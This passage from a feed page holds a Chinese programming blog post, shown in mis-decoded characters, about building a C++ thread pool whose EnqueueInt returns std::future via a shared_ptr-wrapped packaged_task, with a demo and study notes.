<li>æ›´ç³Ÿç³•çš„æ˜¯ï¼šä½ å¦‚æœè®© worker æ‰§è¡Œä¸€ä¸ªâ€œå¼•ç”¨äº†å·²é”€æ¯ pt çš„å‡½æ•°â€ï¼Œä¼šå‡ºç°æ‚¬ç©ºå¼•ç”¨ï¼ˆUBï¼‰</li>
</ul>
</li>
</ul>
<p>æ‰€ä»¥å…³é”®ä¸æ˜¯â€œpt é”€æ¯ fut æ˜¯å¦æœ‰æ•ˆâ€ï¼Œè€Œæ˜¯ï¼š</p>
<blockquote>
<p><strong>å¿…é¡»ä¿è¯ worker æœ€ç»ˆä¸€å®šä¼šæ‰§è¡Œé‚£æ¬¡ <code>pt()</code>ï¼Œå¹¶ä¸”æ‰§è¡Œæ—¶ pt ä»ç„¶æ´»ç€ã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-10">å››ã€ç‰ˆæœ¬è¿­ä»£ 2ï¼šæˆ‘ä¿®åˆ°äº†â€œèƒ½ç¼–è¯‘â€ï¼Œä½†åˆçŠ¯äº†ä¸€ä¸ªå¾ˆçœŸå®çš„å°å‘ï¼š<code>{ p; }</code> ä¸ç­‰äºæ‰§è¡Œä»»åŠ¡</h2>
<p>ä½ é‚£æ—¶æŒ‡å‡ºæˆ‘æœ‰ä¸€ç‰ˆå†™æˆï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[p = std::move(pt)]</span> { <span class="hljs-selector-tag">p</span>; }
</code></pre>
<p>æˆ‘å½“æ—¶çš„çœŸå®é—®é¢˜å°±æ˜¯ï¼šæˆ‘ä»¥ä¸ºâ€œæŠŠ p å†™åœ¨é‡Œé¢å°±ç®—ç”¨äº†â€ï¼Œç»“æœå®ƒæ ¹æœ¬æ²¡æ‰§è¡Œã€‚</p>
<ul>
<li><code>{ p; }</code>ï¼šåªæ˜¯ä¸€ä¸ªæ— æ„ä¹‰è¡¨è¾¾å¼</li>
<li>æˆ‘çœŸæ­£éœ€è¦çš„æ˜¯ï¼š<code>p();</code>ï¼ˆè°ƒç”¨ packaged_taskï¼‰</li>
</ul>
<p>è€Œä¸” <code>packaged_task::operator()</code> ä¸æ˜¯ constï¼Œæ‰€ä»¥ä¸€èˆ¬ lambda è¦å†™ <code>mutable</code> æ‰èƒ½è°ƒç”¨å®ƒã€‚</p>
<p>è¿™ä¸ªå‘æˆ‘åæ¥è‡ªå·±ä¹Ÿè®¤å¯ï¼šå®ƒå±äºâ€œåˆšå­¦æ—¶å¾ˆå®¹æ˜“çŠ¯çš„ä½çº§ä½†çœŸå®é”™è¯¯â€ï¼š</p>
<hr/>
<h2 data-id="heading-11">äº”ã€ç‰ˆæœ¬è¿­ä»£ 3ï¼šæˆ‘æŠŠé€»è¾‘å†™å¯¹äº†ï¼Œä½† VS2022 ç»™æˆ‘ä¸€ä¸ªâ€œç±»å‹ç³»ç»Ÿçš„ç¡¬é™åˆ¶â€æŠ¥é”™ï¼ˆæœ€å…³é”®çš„å‘ï¼‰</h2>
<p>å½“æˆ‘ç»ˆäºå†™æˆâ€œmove æ•è· pt åˆ° lambdaï¼Œç„¶åå¡è¿› tasks_â€æ—¶ï¼Œæˆ‘é‡åˆ°äº†è¿™ä¸ªç¼–è¯‘é”™è¯¯ï¼š</p>
<blockquote>
<p><code>std::function</code> çš„ target å¿…é¡»å¯æ‹·è´ï¼ˆcopy constructibleï¼‰</p>
</blockquote>
<p>æ ¹å› æ˜¯ï¼š</p>
<ul>
<li><code>std::packaged_task</code> æ˜¯ <strong>move-only</strong></li>
<li>lambda æ•è· move-only çš„ pt â†’ lambda ä¹Ÿå˜æˆ <strong>move-only</strong></li>
<li>ä½†æˆ‘çš„é˜Ÿåˆ—ç±»å‹æ˜¯ <code>std::function&lt;void()&gt;</code></li>
<li><strong>MSVC çš„ <code>std::function</code> è¦æ±‚å¯æ‹·è´ï¼Œä¸èƒ½è£… move-only callable</strong></li>
<li>æ‰€ä»¥ static_assert ç›´æ¥ç‚¸æ‰</li>
</ul>
<p>è¿™ä¸€æ­¥æˆ‘å­¦åˆ°ä¸€ä¸ªéå¸¸â€œå·¥ç¨‹â€çš„ç‚¹ï¼š</p>
<blockquote>
<p><strong>ä¸æ˜¯æˆ‘å¹¶å‘é€»è¾‘é”™ï¼Œæ˜¯å®¹å™¨/ç±»å‹æ“¦é™¤å·¥å…·çš„çº¦æŸä¸å…è®¸æˆ‘è¿™ä¹ˆå­˜ã€‚</strong><br/>
åœ¨ VS2022 ä¸‹è¿™æ˜¯ç¡¬é™åˆ¶ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-12">å…­ã€ç‰ˆæœ¬è¿­ä»£ 4ï¼ˆæœ€ç»ˆè·‘é€šï¼‰ï¼šæˆ‘ç”¨ shared_ptr è®© lambda å¯æ‹·è´ï¼ŒæˆåŠŸå¡è¿› <code>std::function&lt;void()&gt;</code></h2>
<p>è§£å†³æ€è·¯å¾ˆæœ´ç´ ï¼š</p>
<ul>
<li>æ—¢ç„¶ <code>std::function</code> è¦æ±‚å¯æ‹·è´</li>
<li>é‚£æˆ‘å°±è®© lambda æ•è·ä¸€ä¸ª<strong>å¯æ‹·è´çš„å¯¹è±¡</strong></li>
<li><code>std::shared_ptr</code> å¯æ‹·è´</li>
<li>æŠŠ <code>packaged_task</code> æ”¾è¿› <code>shared_ptr</code>ï¼Œlambda æ•è· <code>shared_ptr</code>ï¼Œå°±æ»¡è¶³ <code>std::function</code> çš„è¦æ±‚äº†</li>
</ul>
<p>æœ€ç»ˆæˆ‘å†™æˆäº†è¿™æ ·ï¼ˆä¹Ÿæ˜¯æˆ‘æœ€ç»ˆç‰ˆé‡Œä¿ç•™çš„å†™æ³•ï¼‰ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-built_in">std</span>::packaged_task&lt;<span class="hljs-title function_">int</span><span class="hljs-params">()</span>&gt; <span class="hljs-title function_">pt</span><span class="hljs-params">(task)</span>;
<span class="hljs-built_in">std</span>::<span class="hljs-built_in">future</span>&lt;<span class="hljs-type">int</span>&gt; fut = pt.get_future();
<span class="hljs-keyword">auto</span> pt_ptr = <span class="hljs-built_in">std</span>::make_shared&lt;<span class="hljs-built_in">std</span>::packaged_task&lt;<span class="hljs-type">int</span>()&gt;&gt;(<span class="hljs-built_in">std</span>::move(pt));

tasks_.emplace([pt_ptr]() mutable { (*pt_ptr)(); });
<span class="hljs-keyword">return</span> fut;
</code></pre>
<p>åˆ°è¿™é‡Œï¼Œç»“æ„å®Œå…¨é—­ç¯ï¼š</p>
<ul>
<li><code>EnqueueInt</code> è¿”å› <code>future&lt;int&gt;</code></li>
<li>worker æ‰§è¡Œ <code>void()</code> åŒ…è£…ä»»åŠ¡</li>
<li>åŒ…è£…ä»»åŠ¡æ‰§è¡Œ <code>(*pt_ptr)()</code>ï¼ŒæŠŠç»“æœå†™å…¥ future çš„å…±äº«çŠ¶æ€</li>
</ul>
<hr/>
<h2 data-id="heading-13">ä¸ƒã€éªŒè¯ Demoï¼šæˆ‘ä¸ºä»€ä¹ˆè¦å†™è¿™ä¸ª demoï¼Ÿå®ƒéªŒè¯äº†ä»€ä¹ˆï¼Ÿ</h2>
<p>æˆ‘åŒæ„ä½ æè®®â€œå…ˆåšéªŒè¯ demoâ€ï¼Œå› ä¸ºå®ƒèƒ½è®©æˆ‘ç¡®ä¿¡è¿™ä¸æ˜¯â€œæˆ‘ä»¥ä¸ºå†™å¯¹äº†â€ã€‚</p>
<h3 data-id="heading-14">7.1 æˆ‘å†™ demo çš„ç›®çš„ï¼ˆæˆ‘è‡ªå·±çš„æ£€æŸ¥ç‚¹ï¼‰</h3>
<ol>
<li>
<p><strong>ä»»åŠ¡ç¡®å®è·‘åœ¨ worker çº¿ç¨‹ï¼Œä¸æ˜¯åœ¨ main çº¿ç¨‹åŒæ­¥æ‰§è¡Œ</strong></p>
<ul>
<li>é€šè¿‡æ‰“å° <code>std::this_thread::get_id()</code></li>
</ul>
</li>
<li>
<p><strong>future ç¡®å®èƒ½æ‹¿åˆ°ç»“æœ</strong></p>
<ul>
<li><code>get()</code> è¿”å› 1ã€2ã€3</li>
</ul>
</li>
<li>
<p><strong>wait_for èƒ½åæ˜ â€œè¿˜æ²¡å®Œæˆâ€è¿™ç§çŠ¶æ€</strong></p>
<ul>
<li>task2 ç¡ 500ms</li>
<li>main å¯¹ fut2 <code>wait_for(50ms)</code> åº”è¯¥ timeout</li>
</ul>
</li>
</ol>
<p>è¾“å‡ºç¡®å®ç¬¦åˆé¢„æœŸï¼š</p>
<ul>
<li>task thread id â‰  main thread id</li>
<li><code>wait_for(50ms)</code> timeout</li>
<li><code>get()</code> å¾—åˆ° 1,2,3</li>
</ul>
<hr/>
<h2 data-id="heading-15">å…«ã€Day5 æˆ‘å­¦åˆ°çš„æ‰€æœ‰çŸ¥è¯†ç‚¹ï¼ˆè¿™éƒ¨åˆ†æˆ‘æŒ‰â€œå¤ä¹ ç¬”è®°â€æ¥å†™ï¼‰</h2>
<h3 data-id="heading-16">8.1 <code>std::packaged_task&lt;R()&gt;</code> æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>å®ƒæŠŠâ€œä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡â€åŒ…è£…æˆâ€œèƒ½äº§ç”Ÿ future çš„ä»»åŠ¡â€ã€‚</p>
<ul>
<li>
<p><code>packaged_task&lt;int()&gt; pt(task);</code></p>
</li>
<li>
<p><code>future&lt;int&gt; fut = pt.get_future();</code></p>
</li>
<li>
<p>å½“æ‰§è¡Œ <code>pt()</code> æ—¶ï¼š</p>
<ul>
<li>task è¢«æ‰§è¡Œ</li>
<li>è¿”å›å€¼ï¼ˆæˆ–å¼‚å¸¸ï¼‰ä¼šå†™è¿› fut å¯¹åº”çš„å…±äº«çŠ¶æ€</li>
</ul>
</li>
</ul>
<p><strong>å…³é”®ç‚¹</strong>ï¼šæ‰§è¡Œç«¯æ‰§è¡Œ <code>pt()</code>ï¼Œè°ƒç”¨ç«¯æŒæœ‰ <code>fut</code>ã€‚</p>
<hr/>
<h3 data-id="heading-17">8.2 <code>std::future</code> å¸¸ç”¨æ–¹æ³•ï¼ˆé¢è¯•é«˜é¢‘ï¼‰</h3>
<ul>
<li><code>get()</code>ï¼šå–ç»“æœã€‚è‹¥æœªå°±ç»ªï¼Œä¼šé˜»å¡ï¼›åªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼ˆå–èµ°ç»“æœï¼‰</li>
<li><code>wait()</code>ï¼šåªç­‰å¾…å°±ç»ªï¼Œä¸å–ç»“æœ</li>
<li><code>wait_for(duration)</code>ï¼šç­‰ä¸€æ®µæ—¶é—´ï¼Œè¿”å› <code>future_status</code></li>
<li><code>wait_until(time_point)</code>ï¼šç­‰åˆ°æŸä¸ªæ—¶é—´ç‚¹</li>
</ul>
<h4 data-id="heading-18"><code>wait_for</code> çš„è¿”å›å€¼ï¼š<code>std::future_status</code></h4>
<ul>
<li><code>ready</code>ï¼šå·²å°±ç»ª</li>
<li><code>timeout</code>ï¼šè¶…æ—¶æœªå°±ç»ª</li>
<li><code>deferred</code>ï¼šå»¶è¿Ÿæ‰§è¡Œï¼ˆå¸¸è§äº <code>std::async</code> çš„ deferred ç­–ç•¥ï¼›çº¿ç¨‹æ± ä¸€èˆ¬ä¸ä¼šå‡ºç°ï¼‰</li>
</ul>
<p>æˆ‘çš„ demo å°±æ˜¯åœ¨ç”¨å®ƒè§‚å¯Ÿâ€œ50ms æ—¶è¿˜æ²¡å¥½â€ã€‚</p>
<hr/>
<h3 data-id="heading-19">8.3 <code>using namespace std::chrono_literals;</code> æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ</h3>
<p>ä¸ºäº†èƒ½ç›´æ¥å†™ï¼š</p>
<ul>
<li><code>50ms</code></li>
<li><code>100ms</code></li>
<li><code>2s</code></li>
</ul>
<p>å¦åˆ™è¦å†™ï¼š</p>
<ul>
<li><code>std::chrono::milliseconds(50)</code></li>
</ul>
<p>æ‰€ä»¥è¿™å¥æœ¬è´¨ä¸Šæ˜¯ï¼š<strong>å¼€å¯ chrono çš„å­—é¢é‡åç¼€</strong>ï¼Œè®© demo æ›´ç›´è§‚ã€‚</p>
<hr/>
<h3 data-id="heading-20">8.4 ä¸ºä»€ä¹ˆä»»åŠ¡é˜Ÿåˆ—é‡Œå–å‡ºä»»åŠ¡åè¦ <code>unlock()</code> å†æ‰§è¡Œï¼Ÿ</h3>
<p>åœ¨ worker é‡Œæˆ‘å†™çš„æ˜¯ï¼š</p>
<pre><code class="hljs language-php" lang="php">std::<span class="hljs-variable constant_">function</span>&lt;<span class="hljs-keyword">void</span>()&gt; <span class="hljs-function"><span class="hljs-keyword">fn</span> = <span class="hljs-title">std</span>::<span class="hljs-title">move</span>(<span class="hljs-params">tasks_.front(<span class="hljs-params"/>)</span>)</span>;
tasks_.<span class="hljs-title function_ invoke__">pop</span>();
lock.<span class="hljs-title function_ invoke__">unlock</span>();
<span class="hljs-function"><span class="hljs-keyword">fn</span>(<span class="hljs-params"/>)</span>;
</code></pre>
<p>åŸå› æ˜¯ï¼šé”åº”è¯¥åªä¿æŠ¤â€œé˜Ÿåˆ—ç»“æ„â€ï¼Œä¸åº”è¯¥åŒ…ä½â€œä»»åŠ¡æ‰§è¡Œâ€ã€‚</p>
<ul>
<li>
<p>å¦‚æœæ‰§è¡Œä»»åŠ¡æ—¶è¿˜æŒé”ï¼š</p>
<ul>
<li>å…¶å®ƒçº¿ç¨‹æ— æ³•å…¥é˜Ÿ</li>
<li>å…¶å®ƒ worker ä¹ŸæŠ¢ä¸åˆ°é”å–ä»»åŠ¡</li>
<li>çº¿ç¨‹æ± ä¼šé€€åŒ–å¾—å¾ˆä¸¥é‡</li>
</ul>
</li>
</ul>
<p>è¿™æ˜¯çº¿ç¨‹æ± é¢˜é‡Œéå¸¸å…³é”®çš„å·¥ç¨‹ç‚¹ï¼š<strong>é”ç²’åº¦å¿…é¡»å°</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-21">8.5 <code>std::function</code> åœ¨ VS2022 ä¸‹çš„é™åˆ¶ï¼šå¿…é¡»å¯æ‹·è´</h3>
<p>è¿™æ˜¯ Day5 æœ€å¤§å‘ï¼š<br/>
<strong>lambda æ•è·äº† move-onlyï¼ˆæ¯”å¦‚ packaged_taskï¼‰â†’ lambda move-only â†’ std::function è£…ä¸ä¸‹</strong>ã€‚</p>
<p>è§£å†³åŠæ³•ï¼ˆæˆ‘æœ€ç»ˆç”¨çš„ï¼‰ï¼š</p>
<ul>
<li>ç”¨ <code>shared_ptr</code> è®©æ•è·å¯¹è±¡å¯æ‹·è´</li>
<li>ä½¿ lambda å¯æ‹·è´</li>
<li>ä½¿ <code>std::function&lt;void()&gt;</code> èƒ½å­˜</li>
</ul>
<hr/>
<h2 data-id="heading-22">ä¹ã€æˆ‘æœ€ç»ˆè·‘é€šçš„ç‰ˆæœ¬</h2>
<p>ä¸‹é¢æ˜¯æˆ‘ Day5 æœ€ç»ˆç‰ˆã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;condition_variable&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;functional&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;future&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;chrono&gt;</span></span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadPool</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">ThreadPool</span><span class="hljs-params">(<span class="hljs-type">size_t</span> thread_count)</span></span>;
    ~<span class="hljs-built_in">ThreadPool</span>();

    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Enqueue</span><span class="hljs-params">(std::function&lt;<span class="hljs-type">void</span>()&gt; task)</span></span>;
    <span class="hljs-function">std::future&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">EnqueueInt</span><span class="hljs-params">(std::function&lt;<span class="hljs-type">int</span>()&gt; task)</span></span>;

<span class="hljs-keyword">private</span>:
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Work</span><span class="hljs-params">()</span></span>;

    std::vector&lt;std::thread&gt; workers_;
    std::queue&lt;std::function&lt;<span class="hljs-type">void</span>()&gt;&gt; tasks_;
    std::mutex mtx_;
    std::condition_variable cv_;
    <span class="hljs-type">bool</span> stop_ = <span class="hljs-literal">false</span>;
};

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ThreadPool::Work</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx_)</span></span>;
        cv_.<span class="hljs-built_in">wait</span>(lock, [<span class="hljs-keyword">this</span>] { <span class="hljs-keyword">return</span> !tasks_.<span class="hljs-built_in">empty</span>() || stop_; });
        <span class="hljs-keyword">if</span> (stop_ &amp;&amp; tasks_.<span class="hljs-built_in">empty</span>()) <span class="hljs-keyword">break</span>;

        std::function&lt;<span class="hljs-type">void</span>()&gt; fn = std::<span class="hljs-built_in">move</span>(tasks_.<span class="hljs-built_in">front</span>());
        tasks_.<span class="hljs-built_in">pop</span>();

        lock.<span class="hljs-built_in">unlock</span>();
        <span class="hljs-built_in">fn</span>();
    }
}

ThreadPool::<span class="hljs-built_in">ThreadPool</span>(<span class="hljs-type">size_t</span> thread_count) {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(thread_count); ++i) {
        workers_.<span class="hljs-built_in">emplace_back</span>(&amp;ThreadPool::Work, <span class="hljs-keyword">this</span>);
    }
}

ThreadPool::~<span class="hljs-built_in">ThreadPool</span>() {
    <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx_)</span></span>;
    stop_ = <span class="hljs-literal">true</span>;
    lock.<span class="hljs-built_in">unlock</span>();

    cv_.<span class="hljs-built_in">notify_all</span>();

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; t : workers_) {
        t.<span class="hljs-built_in">join</span>();
    }
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ThreadPool::Enqueue</span><span class="hljs-params">(std::function&lt;<span class="hljs-type">void</span>()&gt; task)</span> </span>{
    <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx_)</span></span>;
    <span class="hljs-built_in">assert</span>(!stop_ &amp;&amp; <span class="hljs-string">"ThreadPool stopped"</span>);
    tasks_.<span class="hljs-built_in">push</span>(std::<span class="hljs-built_in">move</span>(task));
    lock.<span class="hljs-built_in">unlock</span>();
    cv_.<span class="hljs-built_in">notify_one</span>();
}

<span class="hljs-function">std::future&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">ThreadPool::EnqueueInt</span><span class="hljs-params">(std::function&lt;<span class="hljs-type">int</span>()&gt; task)</span> </span>{
    <span class="hljs-function">std::packaged_task&lt;<span class="hljs-title">int</span><span class="hljs-params">()</span>&gt; <span class="hljs-title">pt</span><span class="hljs-params">(task)</span></span>;
    std::future&lt;<span class="hljs-type">int</span>&gt; fut = pt.<span class="hljs-built_in">get_future</span>();
    <span class="hljs-keyword">auto</span> pt_ptr = std::make_shared&lt;std::packaged_task&lt;<span class="hljs-built_in">int</span>()&gt;&gt;(std::<span class="hljs-built_in">move</span>(pt));

    <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx_)</span></span>;
    <span class="hljs-built_in">assert</span>(!stop_ &amp;&amp; <span class="hljs-string">"ThreadPool stopped"</span>);
    tasks_.<span class="hljs-built_in">emplace</span>([pt_ptr]() <span class="hljs-keyword">mutable</span> { (*pt_ptr)(); });
    lock.<span class="hljs-built_in">unlock</span>();

    cv_.<span class="hljs-built_in">notify_one</span>();
    <span class="hljs-keyword">return</span> fut;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std::chrono_literals;

    <span class="hljs-function">ThreadPool <span class="hljs-title">pool</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>;

    std::cout &lt;&lt; <span class="hljs-string">"[main] submit tasks, main thread id = "</span>
              &lt;&lt; std::this_thread::<span class="hljs-built_in">get_id</span>() &lt;&lt; std::endl;

    <span class="hljs-keyword">auto</span> fut1 = pool.<span class="hljs-built_in">EnqueueInt</span>([] {
        std::cout &lt;&lt; <span class="hljs-string">"[task1] submit tasks, task1 thread id = "</span>
                  &lt;&lt; std::this_thread::<span class="hljs-built_in">get_id</span>() &lt;&lt; std::endl;
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    });

    <span class="hljs-keyword">auto</span> fut2 = pool.<span class="hljs-built_in">EnqueueInt</span>([] {
        std::cout &lt;&lt; <span class="hljs-string">"[task2] submit tasks, task2 thread id = "</span>
                  &lt;&lt; std::this_thread::<span class="hljs-built_in">get_id</span>() &lt;&lt; std::endl;
        std::this_thread::<span class="hljs-built_in">sleep_for</span>(<span class="hljs-number">500</span>ms);
        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
    });

    <span class="hljs-keyword">auto</span> fut3 = pool.<span class="hljs-built_in">EnqueueInt</span>([] {
        std::cout &lt;&lt; <span class="hljs-string">"[task3] submit tasks, task3 thread id = "</span>
                  &lt;&lt; std::this_thread::<span class="hljs-built_in">get_id</span>() &lt;&lt; std::endl;
        std::this_thread::<span class="hljs-built_in">sleep_for</span>(<span class="hljs-number">100</span>ms);
        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
    });

    <span class="hljs-keyword">auto</span> st = fut2.<span class="hljs-built_in">wait_for</span>(<span class="hljs-number">50</span>ms);
    <span class="hljs-keyword">if</span> (st == std::future_status::ready) {
        std::cout &lt;&lt; <span class="hljs-string">"[main] f2 is ready (unexpected)\n"</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (st == std::future_status::timeout) {
        std::cout &lt;&lt; <span class="hljs-string">"[main] f2 not ready after 50ms (expected timeout)\n"</span>;
    } <span class="hljs-keyword">else</span> {
        std::cout &lt;&lt; <span class="hljs-string">"[main] f2 deferred (usually not in thread pool)\n"</span>;
    }

    <span class="hljs-type">int</span> r1 = fut1.<span class="hljs-built_in">get</span>();
    <span class="hljs-type">int</span> r2 = fut2.<span class="hljs-built_in">get</span>();
    <span class="hljs-type">int</span> r3 = fut3.<span class="hljs-built_in">get</span>();

    std::cout &lt;&lt; <span class="hljs-string">"[main] results: "</span> &lt;&lt; r1 &lt;&lt; <span class="hljs-string">", "</span> &lt;&lt; r2 &lt;&lt; <span class="hljs-string">", "</span> &lt;&lt; r3 &lt;&lt; <span class="hljs-string">"\n"</span>;
    std::cout &lt;&lt; <span class="hljs-string">"[main] done\n"</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-23">åã€Day5 å°ç»“ï¼šæˆ‘ä»Šå¤©çœŸæ­£â€œä»é›¶åˆ°æœ‰â€å­¦ä¼šäº†ä»€ä¹ˆï¼Ÿ</h2>
<p>ä»Šå¤©æˆ‘è§‰å¾—æˆ‘å­¦åˆ°çš„ä¸æ˜¯â€œä¼šå†™ EnqueueIntâ€ï¼Œè€Œæ˜¯ä¸‰ä»¶æ›´é‡è¦çš„äº‹ï¼š</p>
<ol>
<li>
<p><strong>çº¿ç¨‹æ± çš„æ‰§è¡Œç«¯åªåšä¸€ä»¶äº‹ï¼šæ‰§è¡Œ <code>void()</code> ä»»åŠ¡</strong><br/>
è¿”å›å€¼ä¸é  returnï¼Œé  future çš„å…±äº«çŠ¶æ€é€šé“ã€‚</p>
</li>
<li>
<p><strong>future/packaged_task çš„è´£ä»»è¾¹ç•Œéå¸¸æ¸…æ¥š</strong></p>
<ul>
<li>packaged_taskï¼šè´Ÿè´£æŠŠç»“æœå†™è¿›å»</li>
<li>futureï¼šè´Ÿè´£è®©è°ƒç”¨è€…åœ¨åˆé€‚çš„æ—¶é—´å–å‡ºæ¥</li>
</ul>
</li>
<li>
<p><strong>å·¥ç¨‹å®ç°ä¼šé‡åˆ°åº“çº¦æŸï¼ˆVS2022 + std::functionï¼‰</strong><br/>
move-only callable ä¸èƒ½è¿› std::function â†’ ç”¨ shared_ptr è®©å®ƒå¯æ‹·è´ï¼Œè¿™æ˜¯é¢è¯•æ—¶ä¹Ÿèƒ½è®²æ¸…æ¥šçš„â€œå·¥ç¨‹ç‚¹â€ã€‚</p>
</li>
</ol>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Cè¯­è¨€å®æˆ˜ï¼šæ‰‹æ“é«˜å¹¶å‘å¼‚æ­¥æ—¥å¿—åº“ï¼ˆåŸºäº Ring Buffer + ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹ï¼‰]]></title>    <link>https://juejin.cn/post/7582785032852078655</link>    <guid>https://juejin.cn/post/7582785032852078655</guid>    <pubDate>2025-12-12T12:36:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582785032852078655" data-draft-id="7582637280218791990" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Cè¯­è¨€å®æˆ˜ï¼šæ‰‹æ“é«˜å¹¶å‘å¼‚æ­¥æ—¥å¿—åº“ï¼ˆåŸºäº Ring Buffer + ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹ï¼‰"/> <meta itemprop="keywords" content="å¼€æº"/> <meta itemprop="datePublished" content="2025-12-12T12:36:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xlp666hub"/> <meta itemprop="url" content="https://juejin.cn/user/2965810860569131"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Cè¯­è¨€å®æˆ˜ï¼šæ‰‹æ“é«˜å¹¶å‘å¼‚æ­¥æ—¥å¿—åº“ï¼ˆåŸºäº Ring Buffer + ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2965810860569131/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xlp666hub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T12:36:28.000Z" title="Fri Dec 12 2025 12:36:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
